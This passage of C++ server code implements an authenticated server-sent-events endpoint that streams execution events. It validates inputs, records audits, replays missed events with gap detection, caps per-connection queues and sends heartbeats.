        // execution_id is mandatory for the W5.1 skeleton — see
        // sprint plan §2 R-4. Unfiltered subscription expands the
        // attack surface (any authenticated reader fan-out across
        // every tenant's executions) and needs a separate threat
        // model before it ships.
        if (!req.has_param("execution_id")) {
            res.status = 400;
            res.set_content(detail::error_json_a4(
                                400, "execution_id query parameter is required", cid,
                                "pass ?execution_id=<id> to subscribe to a specific execution"),
                            "application/json");
            return;
        }
        auto exec_id = req.get_param_value("execution_id");
        // Same character class as the dashboard sibling — reject
        // any path-traversal / SSRF-ish payload before the store
        // sees it. Keeps the audit-row target_id field clean too.
        static const std::regex kExecIdRe(R"(^[A-Za-z0-9_-]{1,128}$)");
        if (!std::regex_match(exec_id, kExecIdRe)) {
            res.status = 400;
            res.set_content(detail::error_json_a4(400, "execution_id format invalid", cid,
                                                  "execution_id must match [A-Za-z0-9_-]{1,128}"),
                            "application/json");
            return;
        }

        if (!execution_tracker) {
            spdlog::warn("api.v1.events.subscribe denied: tracker unavailable cid={} principal={}",
                         cid, session->username);
            res.status = 503;
            res.set_content(
                detail::error_json_a4(503, "execution tracker unavailable", cid,
                                      /*retry_after_ms=*/5000,
                                      "retry after server warmup; tracker initialises during "
                                      "startup or after a config reload"),
                "application/json");
            return;
        }
        if (!execution_event_bus) {
            spdlog::warn(
                "api.v1.events.subscribe denied: event_bus unavailable cid={} principal={}", cid,
                session->username);
            res.status = 503;
            res.set_content(
                detail::error_json_a4(503, "event bus unavailable", cid,
                                      /*retry_after_ms=*/5000,
                                      "retry after server warmup; live events are unavailable "
                                      "until the bus is initialised"),
                "application/json");
            return;
        }

        auto exec_opt = execution_tracker->get_execution(exec_id);
        if (!exec_opt) {
            spdlog::warn("api.v1.events.subscribe denied: unknown execution cid={} "
                         "principal={} exec_id={}",
                         cid, session->username, exec_id);
            res.status = 404;
            res.set_content(detail::error_json_a4(404, "execution not found", cid),
                            "application/json");
            return;
        }
        // Terminal executions get 410 so the client's auto-
        // reconnect loop terminates. The dashboard sibling does
        // the same — the difference is the body shape (A4
        // envelope here, plaintext there).
        const auto& exec = *exec_opt;
        if (exec.status != "running" && exec.status != "pending") {
            spdlog::warn("api.v1.events.subscribe denied: execution terminal cid={} "
                         "principal={} exec_id={} status={}",
                         cid, session->username, exec_id, exec.status);
            res.status = 410;
            res.set_content(detail::error_json_a4(
                                410, "execution complete; subscribe-time replay unavailable", cid,
                                "fetch the final state via GET /api/v1/executions/<id> instead"),
                            "application/json");
            return;
        }

        // Audit BEFORE the chunked provider takes over — once
        // set_chunked_content_provider runs, headers are sealed.
        // Audit failure surfaces via `Sec-Audit-Failed: true`
        // header per PR #883 / PR W1.1 contract (CC6.6 evidence).
        bool audit_ok = true;
        try {
            audit_ok = audit_fn(req, "api.v1.events.subscribe", "success", "Execution", exec_id,
                                "correlation_id=" + cid);
        } catch (...) {
            audit_ok = false;
        }
        if (!audit_ok) {
            res.set_header("Sec-Audit-Failed", "true");
        }
        res.set_header("X-Correlation-Id", cid);
        res.set_header("Cache-Control", "no-cache");
        res.set_header("X-Accel-Buffering", "no");
        // Belt-and-braces against MIME sniffing on intermediary
        // proxies / browsers that strip the explicit
        // text/event-stream content type. governance round
        // security-guardian LOW-2.
        res.set_header("X-Content-Type-Options", "nosniff");

        // Replay window. `since` query param overrides
        // `Last-Event-ID` header — explicit operator intent beats
        // browser auto-reconnect inference. Bad input → 0 (no
        // replay) rather than 400; matches the dashboard sibling.
        std::uint64_t since_id = 0;
        if (req.has_param("since")) {
            try {
                since_id = std::stoull(req.get_param_value("since"));
            } catch (...) {
                since_id = 0;
            }
        } else if (req.has_header("Last-Event-ID")) {
            try {
                since_id = std::stoull(req.get_header_value("Last-Event-ID"));
            } catch (...) {
                since_id = 0;
            }
        }

        // Endpoint-scoped metric: subscription count.
        // Incremented BEFORE subscribe to avoid a race where a
        // listener fires and modifies the gauge before this line
        // runs.
        if (metrics_registry) {
            metrics_registry
                ->counter("yuzu_server_sse_api_subscriptions_total", {{"route", "events"}})
                .increment();
            metrics_registry->gauge("yuzu_server_sse_api_active", {{"route", "events"}})
                .increment();
        }

        auto sink_state = std::make_shared<detail::SseSinkState>();
        // Replay-gap detection: peek the ring buffer's lowest id.
        // If the buffer's oldest id is greater than `since_id + 1`,
        // events have been evicted (FIFO drop at
        // `kBufferCap=1000`) and the client's replay will be
        // incomplete. Emit a synthetic `replay-gap` envelope as the
        // first frame so the worker knows state may be inconsistent
        // rather than silently observing an `event_id` jump it
        // cannot distinguish from "not yet emitted". governance
        // round unhappy-R1 / R2.
        //
        // The snapshot is taken BEFORE replay_since walks the
        // buffer — `snapshot()` already serialises on the channel
        // mutex, so the lowest id we observe is a valid lower
        // bound. A concurrent publish can widen the buffer at the
        // top but cannot reduce the bottom (FIFO eviction only
        // runs when buffer.size() > kBufferCap).
        // The synthetic gap envelope MUST NOT live on the bounded
        // `queue` — `enqueue_capped`'s drop-oldest would evict it
        // under publisher burst, silently restoring the gap-blindness
        // the synthetic was meant to fix. Stash it in
        // `SseSinkState::pre_emit` instead; the content provider
        // drains it on first invocation BEFORE the bounded queue
        // drain. governance R2 fix for unhappy-NEW-1 HIGH.
        if (since_id > 0) {
            auto snap = execution_event_bus->snapshot(exec_id);
            if (!snap.empty() && snap.front().id > since_id + 1) {
                detail::SseEvent gap_sse;
                gap_sse.event_type = "replay-gap";
                auto gap_payload = JObj()
                                       .add("execution_id", exec_id)
                                       .add("type", "replay-gap")
                                       .add("missing_from", static_cast<int64_t>(since_id + 1))
                                       .add("missing_to", static_cast<int64_t>(snap.front().id - 1))
                                       .str();
                // Use a synthetic id of `since_id + 1` so the
                // client's Last-Event-ID after reconnect doesn't
                // confuse the gap event with a real bus event.
                gap_sse.data = std::to_string(since_id + 1) + "\n" + gap_payload;
                {
                    std::lock_guard<std::mutex> lk(sink_state->mu);
                    sink_state->pre_emit = std::move(gap_sse);
                }
                if (metrics_registry) {
                    metrics_registry
                        ->counter("yuzu_server_sse_api_replay_gap_total", {{"route", "events"}})
                        .increment();
                }
            }
        }

        // Replay then subscribe. Note: a `publish` arriving
        // between the two calls is NOT delivered to this
        // connection — it post-dates the replay walk but
        // pre-dates the listener attach. See the per-route
        // header block above; bus-level fix is tracked as a
        // follow-up.
        std::string exec_id_for_capture = exec_id;
        // Cap enforcement lives in `detail::enqueue_capped`
        // (event_bus.hpp) so it's unit-testable without driving
        // the handler. Both the replay walker and the live
        // subscriber go through it.
        execution_event_bus->replay_since(
            exec_id, since_id, [sink_state, exec_id_for_capture](const ExecutionEvent& ev) {
                detail::SseEvent sse;
                sse.event_type = ev.event_type;
                // Frame the per-bus event into <id>\n<JSON
                // envelope> so the content provider can split and
                // emit `id:` + `event:` + `data:` lines without
                // re-touching the bus.
                sse.data = std::to_string(ev.id) + "\n" +
                           detail::make_event_envelope(exec_id_for_capture, ev);
                detail::enqueue_capped(sink_state, std::move(sse));
            });

        auto* bus = execution_event_bus;
        sink_state->sub_id =
            bus->subscribe(exec_id, [sink_state, exec_id_for_capture](const ExecutionEvent& ev) {
                detail::SseEvent sse;
                sse.event_type = ev.event_type;
                sse.data = std::to_string(ev.id) + "\n" +
                           detail::make_event_envelope(exec_id_for_capture, ev);
                detail::enqueue_capped(sink_state, std::move(sse));
                sink_state->cv.notify_one();
            });

        res.set_chunked_content_provider(
            "text/event-stream",
            [sink_state, exec_id_for_capture, metrics_registry](size_t /*offset*/,
                                                                httplib::DataSink& s) -> bool {
                std::unique_lock<std::mutex> lk(sink_state->mu);
                // Wait condition includes pre_emit so the provider wakes
                // immediately if the handler stashed a synthetic (the
                // handler-thread path may pre-attach a pre_emit before
                // the first publish notify lands).
                sink_state->cv.wait_for(lk, std::chrono::seconds(3), [&] {
                    return !sink_state->queue.empty() || sink_state->closed.load() ||
                           sink_state->pre_emit.has_value();
                });
                if (sink_state->closed.load())
                    return false;

                // Pre-emit synthetic — drained FIRST and out-of-band of
                // the bounded queue so a publisher burst cannot evict
                // it. Currently only used by the replay-gap signal at
                // handler setup. If multiple synthetics ever need this
                // slot, promote `pre_emit` to a small deque. Releases
                // and re-acquires the mutex around the write so the
                // socket I/O doesn't hold the listener path open.
                lk.unlock();
                if (auto pre = sink_state->take_pre_emit(); pre.has_value()) {
                    std::string id_part;
                    std::string data_part;
                    if (auto nl = pre->data.find('\n'); nl != std::string::npos) {
                        id_part = pre->data.substr(0, nl);
                        data_part = pre->data.substr(nl + 1);
                    } else {
                        data_part = std::move(pre->data);
                    }
                    std::string out = "id: " + id_part + "\n" + "event: " + pre->event_type + "\n" +
                                      "data: " + data_part + "\n\n";
                    if (!s.write(out.data(), out.size()))
                        return false;
                }
                lk.lock();

                // Dropped-events synthetic envelope. Read the
                // current dropped total under the queue mutex so
                // the report is consistent with the queue state
                // the provider is about to drain. Emit ONCE per
                // batch of drops (we snapshot, then zero the
                // counter atomically with the report) so a worker
                // that disconnects mid-burst doesn't see the
                // same drop reported on the next reconnect.
                auto dropped_now = sink_state->dropped_total.exchange(0);
                if (dropped_now > 0) {
                    if (metrics_registry) {
                        metrics_registry
                            ->counter("yuzu_server_sse_api_queue_overflow_total",
                                      {{"route", "events"}})
                            .increment(static_cast<double>(dropped_now));
                    }
                    auto dropped_payload =
                        JObj()
                            .add("execution_id", exec_id_for_capture)
                            .add("type", "events-dropped")
                            .add("dropped_count", static_cast<int64_t>(dropped_now))
                            .add("reason", "per-connection queue cap exceeded")
                            .str();
                    std::string out = "event: events-dropped\ndata: " + dropped_payload + "\n\n";
                    if (!s.write(out.data(), out.size()))
                        return false;
                }

                while (!sink_state->queue.empty()) {
                    auto ev = std::move(sink_state->queue.front());
                    sink_state->queue.pop_front();

                    // Split <id>\n<envelope_json>. The listener
                    // queued in that shape; peel back here to
                    // emit the SSE `id:` line the spec requires
                    // (browsers and curl --no-buffer rely on it
                    // to populate Last-Event-ID on reconnect).
                    std::string id_part;
                    std::string data_part;
                    if (auto nl = ev.data.find('\n'); nl != std::string::npos) {
                        id_part = ev.data.substr(0, nl);
                        data_part = ev.data.substr(nl + 1);
                    } else {
                        data_part = std::move(ev.data);
                    }
                    std::string out = "id: " + id_part + "\n" + "event: " + ev.event_type + "\n" +
                                      "data: " + data_part + "\n\n";
                    const char* p = out.data();
                    std::size_t rem = out.size();
                    constexpr std::size_t kMaxSlice = 8192;
                    while (rem > 0) {
                        auto n = std::min(rem, kMaxSlice);
                        if (!s.write(p, n))
                            return false;
                        p += n;
                        rem -= n;
                    }
                }
                // Heartbeat keeps the connection above httplib's
                // 5s Keep-Alive timeout and confirms liveness to
                // intermediary proxies. Same cadence as the
                // dashboard sibling. Note: emitted on every
                // provider invocation, not strictly every 3s —
                // a burst of events flushes them then immediately
                // writes the heartbeat. Agentic workers must
                // tolerate sub-3s heartbeats.
                static const char* keepalive = "event: heartbeat\ndata: \n\n";
                if (!s.write(keepalive, std::strlen(keepalive)))
                    return false;
                return true;
            },
            [sink_state, bus, exec_id_for_capture, metrics_registry](bool /*success*/) {
                sink_state->closed.store(true);
                sink_state->cv.notify_all();
                bus->unsubscribe(exec_id_for_capture, sink_state->sub_id);
                if (metrics_registry) {
                    metrics_registry->gauge("yuzu_server_sse_api_active", {{"route", "events"}})
                        .decrement();
                }
            });
    });

    spdlog::info("REST API v1: registered all routes at /api/v1/*");
}

} // namespace yuzu::server
